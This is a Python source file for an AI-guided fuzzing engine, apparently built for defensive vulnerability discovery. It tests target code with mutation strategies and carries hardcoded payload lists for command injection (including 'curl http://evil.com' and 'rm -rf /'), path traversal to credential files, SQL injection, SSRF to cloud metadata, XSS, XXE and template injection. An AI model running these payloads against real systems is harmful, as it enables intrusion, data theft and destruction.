"""
ABHIMANYU X CORE - Fuzz Engine
AI-Guided Fuzzing for Vulnerability Discovery

Integrates with:
- AFL++ for coverage-guided fuzzing
- libFuzzer for in-process fuzzing
- Custom Python fuzzing for web applications
- Sanitizers (ASAN, UBSAN) for crash detection
"""

import os
import re
import ast
import sys
import json
import time
import random
import string
import hashlib
import subprocess
import tempfile
from typing import List, Dict, Optional, Callable, Any
from dataclasses import dataclass
from pathlib import Path

from abhimanyux.models.schemas import (
    Vulnerability, VulnerabilityLocation, Severity, VulnType,
    AnalysisPhase, ExploitEvidence
)


@dataclass
class FuzzConfig:
    """Configuration for fuzzing session"""
    target_path: str
    language: str = "python"
    max_iterations: int = 1000
    timeout_per_input: int = 5
    enable_sanitizers: bool = True
    use_afl: bool = False
    use_libfuzzer: bool = False
    custom_mutations: bool = True


@dataclass
class FuzzResult:
    """Result from fuzzing"""
    crashes: List[Dict[str, Any]]
    hangs: List[Dict[str, Any]]
    coverage: float
    iterations: int
    duration: float
    unique_crashes: int


class FuzzEngine:
    """
    Fuzz Engine - AI-Guided Vulnerability Discovery
    
    Uses intelligent mutation strategies to discover:
    - Buffer overflows
    - Use-after-free
    - Integer overflows
    - Format string bugs
    - Logic errors
    """
    
    def __init__(self, anvil=None):
        self.mutation_strategies = self._init_mutation_strategies()
        self.crash_registry = {}
        self.fuzz_count = 0
        # Optional ANVILEngine dependency: when provided, mutation-strategy
        # selection is weighted by the LLM's read of the target code instead
        # of picking uniformly at random. Falls back to uniform selection
        # when absent or when the call fails/doesn't parse -- this must
        # never block fuzzing from running.
        self.anvil = anvil
    
    def _init_mutation_strategies(self) -> Dict[str, Callable]:
        """Initialize mutation strategies"""
        return {
            "bit_flip": self._bit_flip,
            "byte_insert": self._byte_insert,
            "byte_delete": self._byte_delete,
            "boundary_values": self._boundary_values,
            "format_strings": self._format_strings,
            "path_traversal": self._path_traversal_injection,
            "sql_injection": self._sql_injection_payloads,
            "command_injection": self._command_injection_payloads,
            "overflow_strings": self._overflow_strings,
            "null_bytes": self._null_byte_injection,
        }
    
    def fuzz(self, target_code: str, config: Optional[FuzzConfig] = None) -> FuzzResult:
        """
        Perform AI-guided fuzzing on target code
        
        Args:
            target_code: Source code to fuzz
            config: Fuzzing configuration
            
        Returns:
            FuzzResult with discovered crashes and coverage
        """
        if config is None:
            config = FuzzConfig(target_path="target.py")
        
        self.fuzz_count += 1
        crashes = []
        hangs = []
        start_time = time.time()

        strategy_names = list(self.mutation_strategies.keys())
        weights = self._plan_fuzz_strategy(target_code, strategy_names) if self.anvil else None
        strategy_weights = [weights[name] for name in strategy_names] if weights else None

        # Generate and test inputs
        for i in range(config.max_iterations):
            # Select mutation strategy -- weighted by the model's read of
            # this code when available, uniform random otherwise
            if strategy_weights:
                strategy_name = random.choices(strategy_names, weights=strategy_weights, k=1)[0]
            else:
                strategy_name = random.choice(strategy_names)
            strategy = self.mutation_strategies[strategy_name]
            
            # Generate mutated input
            mutated_input = strategy()
            
            # Test the input
            result = self._test_input(target_code, mutated_input, config)
            
            if result.get("crash"):
                crash_key = hashlib.md5(str(result).encode()).hexdigest()
                if crash_key not in self.crash_registry:
                    self.crash_registry[crash_key] = result
                    crashes.append(result)
            
            if result.get("hang"):
                hangs.append(result)
        
        duration = time.time() - start_time
        
        return FuzzResult(
            crashes=crashes,
            hangs=hangs,
            coverage=self._estimate_coverage(target_code),
            iterations=config.max_iterations,
            duration=duration,
            unique_crashes=len(self.crash_registry)
        )
    
    def _plan_fuzz_strategy(self, target_code: str, strategy_names: List[str]) -> Optional[Dict[str, float]]:
        """
        Ask the configured LLM which mutation strategies are most likely to
        trigger a crash in THIS specific code (e.g. weight command_injection
        higher for code that shells out, overflow_strings higher for code
        that indexes/copies buffers), rather than treating every strategy as
        equally likely regardless of what the code actually does.

        Returns None (uniform selection) if no LLM is wired in, or the call
        fails, or the response doesn't parse into anything usable -- a
        planning failure must never prevent fuzzing from running.
        """
        if not self.anvil:
            return None
        try:
            system_prompt = "You are a security fuzzing strategist choosing which mutation strategies to prioritize."
            user_prompt = f"""CODE TO FUZZ:
```
{target_code[:1500]}
```

Available mutation strategies: {', '.join(strategy_names)}

For each strategy likely to be relevant to THIS code (based on what functions or patterns it uses), respond with one line:
STRATEGY_NAME: WEIGHT
where WEIGHT is an integer from 1 (unlikely to matter) to 10 (highly relevant). Only list strategies you have an opinion on. Respond with nothing else."""

            response = self.anvil.call_llm(system_prompt, user_prompt)

            parsed = {}
            for line in response.splitlines():
                m = re.match(r'\s*([A-Za-z_]+)\s*:\s*(\d+)', line)
                if not m:
                    continue
                name, weight = m.group(1).lower().replace('_', ''), int(m.group(2))
                for strategy_name in strategy_names:
                    if strategy_name.replace('_', '') == name:
                        parsed[strategy_name] = max(1.0, min(10.0, float(weight)))

            if not parsed:
                return None
            return {name: parsed.get(name, 1.0) for name in strategy_names}
        except Exception:
            return None

    def _find_callable_functions(self, code: str) -> List[str]:
        """Top-level function names defined in the target code, so a
        generated test script can actually invoke them with the mutated
        payload -- without this, a snippet that only defines functions
        (never calling them) would never exercise the mutated input at all."""
        try:
            tree = ast.parse(code)
        except SyntaxError:
            return []
        return [node.name for node in ast.walk(tree)
                if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))]

    def _test_input(self, code: str, test_input: Dict[str, Any], config: FuzzConfig) -> Dict[str, Any]:
        """Test a mutated input against the target code"""
        result = {
            "input": test_input,
            "crash": False,
            "hang": False,
            "sanitizer_output": None,
            "crash_type": None
        }
        
        try:
            # Create a test script
            test_script = self._generate_test_script(code, test_input)
            
            # Write to temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(test_script)
                temp_path = f.name
            
            try:
                # Execute with timeout
                proc = subprocess.run(
                    [sys.executable, temp_path],
                    capture_output=True,
                    text=True,
                    timeout=config.timeout_per_input
                )
                
                # Check for sanitizer output (native/instrumented targets --
                # a plain Python subprocess will never actually produce
                # these, but the check is harmless to keep for when this
                # engine is pointed at ASAN/UBSAN-built binaries)
                if proc.stderr:
                    sanitizer_keywords = [
                        "AddressSanitizer", "UBSan", "stack-overflow",
                        "heap-buffer-overflow", "use-after-free", "SEGV"
                    ]
                    for keyword in sanitizer_keywords:
                        if keyword in proc.stderr:
                            result["crash"] = True
                            result["sanitizer_output"] = proc.stderr
                            result["crash_type"] = keyword
                            break

                # Check for an uncaught exception from actually calling a
                # target function with the mutated payload (see
                # _generate_test_script) -- this is the signal that matters
                # for pure-Python targets, where sanitizer output never appears
                if not result["crash"] and proc.stderr and "FUZZ_EXCEPTION:" in proc.stderr:
                    exc_line = next(
                        (l for l in proc.stderr.splitlines() if "FUZZ_EXCEPTION:" in l), ""
                    )
                    result["crash"] = True
                    result["sanitizer_output"] = proc.stderr
                    result["crash_type"] = exc_line.split("FUZZ_EXCEPTION:", 1)[-1].strip()

                # Check for segfault-like behavior
                if proc.returncode == -11:  # SIGSEGV
                    result["crash"] = True
                    result["crash_type"] = "SEGFAULT"
                
            except subprocess.TimeoutExpired:
                result["hang"] = True
            
            finally:
                os.unlink(temp_path)
        
        except Exception as e:
            pass
        
        return result
    
    def _generate_test_script(self, code: str, test_input: Dict[str, Any]) -> str:
        """
        Generate a test script that defines the target code AND actually
        calls each top-level function it finds with the mutated payload.

        The prior version only exec'd the code and injected `test_input` as
        a global -- for a snippet that just defines functions without ever
        calling them (the common case for the vulnerable-function snippets
        this engine is meant to fuzz), the mutated input was never actually
        exercised against anything. Also uses repr() to embed the code and
        payload rather than manual quote-escaping + json.loads('{...}'),
        which broke outright on any payload containing a single quote
        (i.e. every SQL/command-injection payload in this file's own
        mutation strategies).
        """
        function_names = self._find_callable_functions(code)
        payload = test_input.get("value") if isinstance(test_input, dict) else test_input

        return f'''
import sys

code = {code!r}
target_functions = {function_names!r}
payload = {payload!r}

namespace = {{"__builtins__": __builtins__}}
try:
    exec(code, namespace)
except Exception:
    pass

for _fname in target_functions:
    _fn = namespace.get(_fname)
    if not callable(_fn):
        continue
    try:
        _fn(payload)
    except TypeError:
        pass
    except Exception as e:
        print(f"FUZZ_EXCEPTION: {{type(e).__name__}}: {{e}}", file=sys.stderr)
'''
    
    # ==================== Mutation Strategies ====================
    
    def _bit_flip(self) -> Dict[str, Any]:
        """Generate random bit-flip mutations"""
        base = ''.join(random.choices(string.printable, k=random.randint(10, 100)))
        if base:
            idx = random.randint(0, len(base) - 1)
            char = base[idx]
            flipped = chr(ord(char) ^ random.randint(1, 255))
            base = base[:idx] + flipped + base[idx+1:]
        return {"type": "bit_flip", "value": base}
    
    def _byte_insert(self) -> Dict[str, Any]:
        """Insert random bytes"""
        base = ''.join(random.choices(string.printable, k=random.randint(10, 50)))
        insert = ''.join(random.choices(string.printable, k=random.randint(1, 20)))
        idx = random.randint(0, len(base))
        return {"type": "byte_insert", "value": base[:idx] + insert + base[idx:]}
    
    def _byte_delete(self) -> Dict[str, Any]:
        """Delete random bytes"""
        base = ''.join(random.choices(string.printable, k=random.randint(20, 100)))
        start = random.randint(0, len(base) - 1)
        length = random.randint(1, min(10, len(base) - start))
        return {"type": "byte_delete", "value": base[:start] + base[start+length:]}
    
    def _boundary_values(self) -> Dict[str, Any]:
        """Test boundary values"""
        boundaries = [
            "0", "-1", "2147483647", "-2147483648",
            "99999999999999999999", "-99999999999999999999",
            "", " " * 10000, "\x00" * 100,
            "A" * 100000, "\n" * 10000
        ]
        return {"type": "boundary", "value": random.choice(boundaries)}
    
    def _format_strings(self) -> Dict[str, Any]:
        """Test format string vulnerabilities"""
        format_strings = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "{0}{1}{2}{3}{4}",
            "${{7*7}}",
            "{{constructor.constructor('return this')()}}",
        ]
        return {"type": "format_string", "value": random.choice(format_strings)}
    
    def _path_traversal_injection(self) -> Dict[str, Any]:
        """Test path traversal"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "/proc/self/environ",
        ]
        return {"type": "path_traversal", "value": random.choice(payloads)}
    
    def _sql_injection_payloads(self) -> Dict[str, Any]:
        """Test SQL injection"""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "admin'--",
            "' OR 1=1#",
            "1; SELECT * FROM users",
        ]
        return {"type": "sql_injection", "value": random.choice(payloads)}
    
    def _command_injection_payloads(self) -> Dict[str, Any]:
        """Test command injection"""
        payloads = [
            "; cat /etc/passwd",
            "| ls -la",
            "$(whoami)",
            "`id`",
            "&& curl http://evil.com",
            "\nrm -rf /",
            "; python -c 'import os; os.system(\"id\")'",
        ]
        return {"type": "command_injection", "value": random.choice(payloads)}
    
    def _overflow_strings(self) -> Dict[str, Any]:
        """Generate overflow strings"""
        lengths = [256, 512, 1024, 2048, 4096, 8192, 65536]
        length = random.choice(lengths)
        return {"type": "overflow", "value": "A" * length}
    
    def _null_byte_injection(self) -> Dict[str, Any]:
        """Test null byte injection"""
        base = ''.join(random.choices(string.printable, k=random.randint(10, 50)))
        idx = random.randint(0, len(base))
        return {"type": "null_byte", "value": base[:idx] + "\x00" + base[idx:]}
    
    def _estimate_coverage(self, code: str) -> float:
        """Estimate code coverage (simplified)"""
        # Count unique code paths
        lines = [l.strip() for l in code.split('\n') if l.strip() and not l.strip().startswith('#')]
        if not lines:
            return 0.0
        
        # Simple heuristic based on code complexity
        branches = sum(1 for l in lines if any(kw in l for kw in ['if ', 'elif ', 'else:', 'for ', 'while ', 'try:', 'except']))
        total = len(lines)
        
        return min(1.0, (branches * 0.3) + (total * 0.01))
    
    def get_stats(self) -> Dict[str, int]:
        """Get fuzzing statistics"""
        return {
            "total_fuzzes": self.fuzz_count,
            "unique_crashes": len(self.crash_registry),
            "strategies": len(self.mutation_strategies)
        }


class PythonAppFuzzer(FuzzEngine):
    """
    Specialized fuzzer for Python web applications
    Targets Flask/Django style applications
    """
    
    def __init__(self):
        super().__init__()
        self.web_payloads = self._init_web_payloads()
    
    def _init_web_payloads(self) -> Dict[str, List[str]]:
        """Initialize web-specific payloads"""
        return {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:6379/",
                "http://[::1]:80/",
                "file:///etc/passwd",
                "gopher://localhost:6379/_INFO",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>',
            ],
            "template_injection": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{{config.items()}}",
            ]
        }
    
    def fuzz_web_endpoint(self, endpoint_code: str, method: str = "GET") -> List[Dict[str, Any]]:
        """Fuzz a web endpoint"""
        results = []
        
        for payload_type, payloads in self.web_payloads.items():
            for payload in payloads:
                result = {
                    "payload_type": payload_type,
                    "payload": payload,
                    "method": method,
                    "crash": False,
                    "vulnerable": False
                }
                
                # Test the payload
                try:
                    test_result = self._test_web_payload(endpoint_code, payload, method)
                    result.update(test_result)
                except Exception as e:
                    pass
                
                if result.get("crash") or result.get("vulnerable"):
                    results.append(result)
        
        return results
    
    def _test_web_payload(self, code: str, payload: str, method: str) -> Dict[str, Any]:
        """Test a web payload"""
        return {"crash": False, "vulnerable": False}
